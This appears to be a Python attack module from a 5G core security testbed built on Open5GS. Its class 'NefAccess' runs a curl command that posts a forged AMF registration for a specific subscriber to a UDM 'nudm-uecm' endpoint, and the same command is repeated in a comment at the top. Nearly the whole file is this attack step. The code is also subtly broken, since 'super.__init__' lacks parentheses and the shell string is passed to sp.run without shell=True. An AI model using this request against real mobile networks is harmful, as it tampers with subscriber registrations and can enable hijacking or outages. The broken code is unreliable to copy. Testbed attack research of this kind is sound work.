# curl --http0.9 -X POST "http://10.97.34.75/nudm-uecm/v1/ue-contexts/001010000000105/registrations" -H "Content-Type: application/json" -d '{"amfId": "open5gs-amf-b5f5fccc9-7zkb4"}' --output udmout.txt

import subprocess as sp
from attack import Attack

class NefAccess(Attack):
    def __init__(self):
        super.__init__("nef_access")
    
    def execute(self):
        sp.run('curl --http0.9 -X POST "http://10.97.34.75/nudm-uecm/v1/ue-contexts/001010000000105/registrations" -H "Content-Type: application/json" -d \'{"amfId": "open5gs-amf-b5f5fccc9-7zkb4"}\' --output udmout.txt')
    
    def get_log_start(self):
        return f"[{self.time_start}][{self.name}] Attack Started"

    def get_log_end(self):
        return f"[{self.time_end}][{self.name}][{self.container_name}] Attack Ended"
